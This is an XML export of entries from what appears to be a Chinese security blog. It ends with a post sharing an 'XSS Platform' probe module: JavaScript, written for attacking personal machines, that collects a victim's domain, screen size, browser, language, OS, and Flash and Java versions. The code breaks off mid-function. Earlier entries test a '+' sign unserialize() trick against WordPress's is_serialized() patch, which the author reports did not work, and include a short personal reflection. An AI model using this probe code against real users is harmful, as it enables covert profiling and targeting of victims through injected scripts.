yy18，yy18是直接退出序列处理，yy20是对object性的序列的处理，所以从上边可以看出：&nbsp; `O:+4:”test”:1:{s:1:”a”;s:3:”aaa”;}&nbsp; O:4:”test”:1:{s:1:”a”;s:3:”aaa”;}` 都能够被unserialize反序列化，且结果相同。&nbsp; 2.实际测试：&nbsp; `&lt;?php&nbsp; var_dump(unserialize(’O:+4:”test”:1:{s:1:”a”;s:3:”aaa”;}’));&nbsp; var_dump(unserialize(’O:4:”test”:1:{s:1:”a”;s:3:”aaa”;}’));&nbsp; ?&gt;` 输出：&nbsp; `object(PHP_Incomplete_Class)#1 (2) { [“PHP_Incomplete_Class_Name”]=&gt; string(4) “test” [“a”]=&gt; string(3) “aaa” }&nbsp; object(PHP_Incomplete_Class)#1 (2) { [“PHP_Incomplete_Class_Name”]=&gt; string(4) “test” [“a”]=&gt; string(3) “aaa” }` 其实，不光object类型处理可以多一个’+’,其他类型也可以，具体测试不做过多描述。&nbsp; 3.我们看下wp的补丁：&nbsp; `function is_serialized( $data, $strict = true ) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// if it isn’t a string, it isn’t serialized&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( ! is_string( $data ) )&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = trim( $data );&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ( ’N;’ == $data )&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return true;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$length = strlen( $data );&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( $length &lt; 4 )&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( ’:’ !== $data[1] )&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( $strict ) {//output&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$lastc = $data[ $length - 1 ];&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( ’;’ !== $lastc &amp;&amp; ’}’ !== $lastc )&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {//input&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$semicolon = strpos( $data, ’;’ );&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$brace&nbsp;&nbsp;&nbsp;&nbsp; = strpos( $data, ’}’ );&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Either ; or } must exist.&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( false === $semicolon &amp;&amp; false === $brace )&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// But neither must be in the first X characters.&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( false !== $semicolon &amp;&amp; $semicolon &lt; 3 )&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( false !== $brace &amp;&amp; $brace &lt; 4 )&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$token = $data[0];&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch ( $token ) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’s’ :&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( $strict ) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( ’”’ !== $data[ $length - 2 ] )&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} elseif ( false === strpos( $data, ’”’ ) ) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’a’ :&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’O’ :&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo “a”;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (bool) preg_match( “/^{$token}:[0-9]+:/s”, $data );&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’b’ :&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’i’ :&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’d’ :&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$end = $strict ? ’$’ : ’’;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (bool) preg_match( “/^{$token}:[0-9.E-]+;$end/“, $data );&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp; }` 补丁中的&nbsp; return (bool) preg_match( &quot;/^{$token}:[0-9]+:/s&quot;, $data ); 可以多一个’+’来绕过，虽然我们通过这个方法把序列值写入了数据库，但从数据库中提取数据，再次验证的时候却没法绕过了，我这个加号没能使数据进出数据库发生任何变化，我个人认为这个补丁绕过重点在于数据进出数据的前后变化。&nbsp; 4.总结&nbsp; 虽然没有绕过wp补丁，但这个unserialize()的小特性可能会被很多开发人员忽略，导致程序出现安全缺陷。&nbsp; 以上的分析有什么错误请留言指出。&nbsp; 5.参考&nbsp; 《WordPress &lt; 3.6.1 PHP Object Injection》&nbsp; http://vagosec.org/2013/09/wordpress-php-object-injection/&nbsp; 《var_unserializer.c源码》&nbsp; https://github.com/php/php-src/blob/73cd2e0ab14d804c6bf0b689490bdd4fd6e969b1/ext/standard/var_unserializer.c&nbsp; 《PHP string序列化与反序列化语法解析不一致带来的安全隐患》&nbsp; http://zone.wooyun.org/content/1664]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>bypass</tag>
        <tag>unseriliaze</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[写在2013/9/7]]></title>
    <url>%2F2013%2F09%2F07%2F%E5%86%99%E5%9C%A82013-9-7%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp;刚看道哥博客，看见一篇文章http://taosay.net/?p=705，《你尽力了吗？》。 看完这篇博文，颇有感触。同个技术点，多篇文章，很多时候我们都放过了90%，只看了10%，最后我们却错过了50%。 记得看过道哥关于《hacking&nbsp;for fun》的演讲，感觉比较符合自己最初的感觉，而和黑哥聊到《hacking for fun》的时候说，道哥忽悠了一大片孩子。 在和前辈的一些聊天中，我说工作了就没有了现在“玩”技术的感觉，感觉不一样了，有的前辈赞同，有点前辈不认同。 &nbsp; &nbsp; &nbsp; 有句话这么说来着，“一千个读者就有一千个哈姆雷特”。 &nbsp; &nbsp; 有时候坚持自己的本心还是非常有必要的，最原始的目的才是最真实的目的。]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[[XSS Platform] xss探针模块]]></title>
    <url>%2F2013%2F09%2F04%2FXSS-Platform-xss%E6%8E%A2%E9%92%88%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[一个完善强大的xss探针对渗透个人机至关重要，怎么才算一个比较完善强大的xss探针呢？首先，兼容性好，兼容主流浏览器（ie、chrome、firefox、safari）。其次，具备以下功能：实现功能: domain screen&nbsp;&nbsp;//初步判断台式机还是笔记本 browser_name browser_version language Osystem flash_version java_version没有实现功能： antivirus browser_expand* pc_software希望各位大牛共享下你们自己的高端大气上档次的代码，没有最猥琐，只有更猥琐我先共享下我个人胡乱写的一个xss platform 探针模块代码1：&nbsp;1. var info = {};var deployJava=function(){function g(n){if(!d.debug){return}if(console.log){console.log(n)}else{alert(n)}}var d={debug:null,version:”20120801”,firefoxJavaVersion:null,oldMimeType:”application/npruntime-scriptable-plugin;DeploymentToolkit”,mimeType:”application/java-deployment-toolkit”,browserName:null,browserName2:null,getJREs:function(){var r=new Array();if(this.isPluginInstalled()){var q=this.getPlugin();var n=q.jvms;for(var p=0;p&lt;n.getLength();p++){r[p]=n.get(p).version}}else{var o=this.getBrowser();if(o==”MSIE”){if(this.testUsingActiveX(“1.7.0”)){r[0]=”1.7.0”}else{if(this.testUsingActiveX(“1.6.0”)){r[0]=”1.6.0”}else{if(this.testUsingActiveX(“1.5.0”)){r[0]=”1.5.0”}else{if(this.testUsingActiveX(“1.4.2”)){r[0]=”1.4.2”}else{if(this.testForMSVM()){r[0]=”1.1”}}}}}}else{if(o==”Netscape Family”){this.getJPIVersionUsingMimeType();if(this.firefoxJavaVersion!=null){r[0]=this.firefoxJavaVersion}else{if(this.testUsingMimeTypes(“1.7”)){r[0]=”1.7.0”}else{if(this.testUsingMimeTypes(“1.6”)){r[0]=”1.6.0”}else{if(this.testUsingMimeTypes(“1.5”)){r[0]=”1.5.0”}else{if(this.testUsingMimeTypes(“1.4.2”)){r[0]=”1.4.2”}else{if(this.browserName2==”Safari”){if(this.testUsingPluginsArray(“1.7.0”)){r[0]=”1.7.0”}else{if(this.testUsingPluginsArray(“1.6”)){r[0]=”1.6.0”}else{if(this.testUsingPluginsArray(“1.5”)){r[0]=”1.5.0”}else{if(this.testUsingPluginsArray(“1.4.2”)){r[0]=”1.4.2”}}}}}}}}}}}}}if(this.debug){for(var p=0;p&lt;r.length;++p){g(“[getJREs()] We claim to have detected Java SE “+r[p])}}return r},getJPIVersionUsingMimeType:function(){for(var o=0;o&lt;navigator.mimeTypes.length;++o){var p=navigator.mimeTypes[o].type;var n=p.match(/^application/x-java-applet;jpi-version=(.&amp;#42)$/);if(n!=null){this.firefoxJavaVersion=n[1];if(“Opera”!=this.browserName2){break}}}},isPluginInstalled:function(){var n=this.getPlugin();if(n&amp;&amp;n.jvms){return true}else{return false}},allowPlugin:function(){this.getBrowser();var n=(“Safari”!=this.browserName2&amp;&amp;”Opera”!=this.browserName2);return n},getPlugin:function(){this.refresh();var n=null;if(this.allowPlugin()){n=document.getElementById(“deployJavaPlugin”)}return n},compareVersionToPattern:function(u,o,q,r){if(u==undefined||o==undefined){return false}var v=”^(\d+)(?:.(\d+)(?:.(\d+)(?:_(\d+))?)?)?[&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;DISCUZ_CODE_0&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;]quot;;var w=u.match(v);if(w!=null){var t=0;var x=new Array();for(var p=1;p&lt;w.length;++p){if((typeof w[p]==”string”)&amp;&amp;(w[p]!=””)){x[t]=w[p];t++}}var n=Math.min(x.length,o.length);if(r){for(var p=0;p&lt;n;++p){if(x[p]&lt;o[p]){return false}else{if(x[p]&gt;o[p]){return true}}}return true}else{for(var p=0;p&lt;n;++p){if(x[p]!=o[p]){return false}}if(q){return true}else{return(x.length==o.length)}}}else{return false}},getBrowser:function(){if(this.browserName==null){var n=navigator.userAgent.toLowerCase();g(“[getBrowser()] navigator.userAgent.toLowerCase() -&gt; “+n);if((n.indexOf(“msie”)!=-1)&amp;&amp;(n.indexOf(“opera”)==-1)){this.browserName=”MSIE”;this.browserName2=”MSIE”}else{if(n.indexOf(“iphone”)!=-1){this.browserName=”Netscape Family”;this.browserName2=”iPhone”}else{if((n.indexOf(“firefox”)!=-1)&amp;&amp;(n.indexOf(“opera”)==-1)){this.browserName=”Netscape Family”;this.browserName2=”Firefox”}else{if(n.indexOf(“chrome”)!=-1){this.browserName=”Netscape Family”;this.browserName2=”Chrome”}else{if(n.indexOf(“safari”)!=-1){this.browserName=”Netscape Family”;this.browserName2=”Safari”}else{if((n.indexOf(“mozilla”)!=-1)&amp;&amp;(n.indexOf(“opera”)==-1)){this.browserName=”Netscape Family”;this.browserName2=”Other”}else{if(n.indexOf(“opera”)!=-1){this.browserName=”Netscape Family”;this.browserName2=”Opera”}else{this.browserName=”?”;this.browserName2=”unknown”}}}}}}}g(“[getBrowser()] Detected browser name:”+this.browserName+”, “+this.browserName2)}return this.browserName},testUsingActiveX:function(n){var p=”JavaWebStart.isInstalled.”+n+”.0”;if(typeof ActiveXObject==”undefined”||!ActiveXObject){g(“[testUsingActiveX()] Browser claims to be IE, but no ActiveXObject object?”);return false}try{return(new ActiveXObject(p)!=null)}catch(o){return false}},testForMSVM:function(){var o=”{08B0E5C0-4FCB-11CF-AAA5-00401C608500}”;if(typeof oClientCaps!=”undefined”){var n=oClientCaps.getComponentVersion(o,”ComponentID”);if((n==””)||(n==”5,0,5000,0”)){return false}else{return true}}else{return false}},testUsingMimeTypes:function(o){if(!navigator.mimeTypes){g(“[testUsingMimeTypes()] Browser claims to be Netscape family, but no mimeTypes[] array?”);return false}for(var p=0;p&lt;navigator.mimeTypes.length;++p){s=navigator.mimeTypes[p].type;var n=s.match(/^application/x-java-appletx3Bversion=(1.8|1.7|1.6|1.5|1.4.2)$/);if(n!=null){if(this.compareVersions(n[1],o)){return true}}}return false},testUsingPluginsArray:function(o){if((!navigator.plugins)||(!navigator.plugins.length)){return false}var n=navigator.platform.toLowerCase();for(var p=0;p&lt;navigator.plugins.length;++p){s=navigator.plugins[p].description;if(s.search(/^Java Switchable Plug-in (Cocoa)/)!=-1){if(this.compareVersions(“1.5.0”,o)){return true}}else{if(s.search(/^Java/)!=-1){if(n.indexOf(“win”)!=-1){if(this.compareVersions(“1.5.0”,o)||this.compareVersions(“1.6.0”,o)){return true}}}}}if(this.compareVersions(“1.5.0”,o)){return true}return false},compareVersions:function(q,r){var o=q.split(“.”);var n=r.split(“.”);for(var p=0;p&lt;o.length;++p){o[p]=Number(o[p])}for(var p=0;p&lt;n.length;++p){n[p]=Number(n[p])}if(o.length==2){o[2]=0}if(o[0]&gt;n[0]){return true}if(o[0]&lt;n[0]){return false}if(o[1]&gt;n[1]){return true}if(o[1]&lt;n[1]){return false}if(o[2]&gt;n[2]){return true}if(o[2]&lt;n[2]){return false}return true},refresh:function(){navigator.plugins.refresh(false);var n=this.getBrowser();if(n==”Netscape Family”&amp;&amp;this.allowPlugin()){var o=document.getElementById(“deployJavaPlugin”);if(o==null){this.writeEmbedTag()}}},writeEmbedTag:function(){var n=false;if(navigator.mimeTypes!=null){for(var o=0;o&lt;navigator.mimeTypes.length;o++){if(navigator.mimeTypes[o].type==this.mimeType){if(navigator.mimeTypes[o].enabledPlugin){document.write(’&lt;embed id=”deployJavaPlugin” type=”’+this.mimeType+’” hidden=”true” /&gt;’);n=true}}}if(!n){for(var o=0;o&lt;navigator.mimeTypes.length;o++){if(navigator.mimeTypes[o].type==this.oldMimeType){if(navigator.mimeTypes[o].enabledPlugin){document.write(’&lt;embed id=”deployJavaPlugin” type=”’+this.oldMimeType+’” hidden=”true” /&gt;’)}}}}}}};return d}();2. //网站域名info.domain = document.domain;/&amp;#42//网页标题info.title = document.title;&amp;#42///屏幕分辨率info.screen = function(){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var c = “”;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (self.screen) {c = screen.width+”x”+screen.height;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return c;}();3. //浏览器和版本info.browser = function(){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var Sys = {};&nbsp; &nbsp; var ua = navigator.userAgent.toLowerCase();&nbsp; &nbsp; var s;&nbsp; &nbsp; (s = ua.match(/msie ([d.]+)/)) ? Sys.ie = s[1] :&nbsp; &nbsp; (s = ua.match(/firefox/([d.]+)/)) ? Sys.firefox = s[1] :&nbsp; &nbsp; (s = ua.match(/chrome/([d.]+)/)) ? Sys.chrome = s[1] :&nbsp; &nbsp; (s = ua.match(/opera.([d.]+)/)) ? Sys.opera = s[1] :&nbsp; &nbsp; (s = ua.match(/version/([d.]+).&amp;#42safari/)) ? Sys.safari = s[1] : 0;&nbsp; &nbsp; if (Sys.ie) return {name: ’IE’&nbsp;&nbsp;|| “”, version: Sys.ie || “0”};&nbsp; &nbsp; if (Sys.firefox) return {name: ’Firefox’ || “”, version: Sys.firefox || “0”};&nbsp; &nbsp; if (Sys.chrome) return {name: ’Chrome’ || “”, version: Sys.chrome || “0”};&nbsp; &nbsp; if (Sys.opera) return {name: ’Opera’ || “”, version: Sys.opera || “0”};&nbsp; &nbsp; if (Sys.safari) return {name: ’Safari’ || “”, version: Sys.safari || “0”};}();4. //浏览器语言info.lang = function(){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var type=navigator.appName&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (type==”Netscape”){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; var lang = navigator.language;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}else{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; var lang = navigator.userLanguage;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return lang;}();5. //系统平台info.system = function (){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var appVer = navigator.userAgent;&nbsp; &nbsp; var _pf = navigator.platform;&nbsp; &nbsp;&nbsp; &nbsp;if(_pf == “Win32” || _pf == “Windows”){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; if(appVer.indexOf(“Windows NT 6.0”) &gt; -1&nbsp;&nbsp;|| appVer.indexOf(“Windows Vista”) &gt; -1){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return ’Windows Vista’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else if(appVer.indexOf(“Windows NT 6.1”) &gt; -1 || appVer.indexOf(“Windows 7”) &gt; -1){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return ’Windows 7’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }else if(appVer.indexOf(“Windows NT 6.2”) &gt; -1 || appVer.indexOf(“Windows 8”) &gt; -1){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return ’Windows 8’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;try{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;var _winName = Array(’2000’,’XP’,’2003’);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;var _ntNum = appVer.match(/Windows NT 5.d/i).toString();&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return ’Windows ’ + _winName[_ntNum.replace(/Windows NT 5.(d)/i,”$1”)];&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}catch(e){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return ’Windows’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;&nbsp; &nbsp;}else if(_pf == “Mac68K” || _pf == “MacPPC” || _pf == “Macintosh”){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return “Mac”;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else if(_pf == “X11”){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return “Unix”;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else if(String(_pf).indexOf(“Linux”) &gt; -1){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return “Linux”;&nbsp; &nbsp;&nbsp; &nbsp; }else{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return “Unknow”;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}();&nbsp;&nbsp;6. //flash版本info.flash = function(){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var f=””,n=navigator;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (n.plugins &amp;&amp; n.plugins.length) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; for (var ii=0;ii&lt;n.plugins.length;ii++) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if (n.plugins[ii].name.indexOf(’Shockwave Flash’)!=-1) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;f=n.plugins[ii].description.split(’Shockwave Flash ’)[1];&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;break;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; 